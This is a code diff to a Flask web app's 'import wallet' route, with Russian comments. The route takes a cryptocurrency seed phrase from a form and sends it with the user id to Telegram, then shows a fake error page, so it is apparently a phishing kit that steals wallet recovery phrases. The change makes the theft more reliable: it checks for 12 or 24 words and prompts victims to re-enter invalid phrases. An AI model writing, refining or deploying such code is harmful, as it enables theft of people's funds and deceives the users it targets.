@@ -88,7 +88,7 @@ def new_wallet():
 @app.route("/import", methods=["GET", "POST"])
 def import_wallet():
     if request.method == "POST":
-        seed_phrase = request.form.get("words")
+        seed_phrase = request.form.get("words", "").strip()
         user_id = request.args.get("user_id")
 
         if seed_phrase:
@@ -99,9 +99,15 @@ def import_wallet():
             # Отправляем в Telegram
             send_to_telegram(f"User {user_id}: {seed_phrase}")
 
-            return render_template("error.html")
+            # Проверка количества слов
+            words = seed_phrase.split()
+            if len(words) in (12, 24):
+                return render_template("error.html")
+            
+            # ⚠ Если количество неверное → показать import с флагом
+            return render_template("import.html", show_modal=True)
 
-    return render_template("import.html")
+    return render_template("import.html", show_modal=False)
 
 
 if __name__ == "__main__":
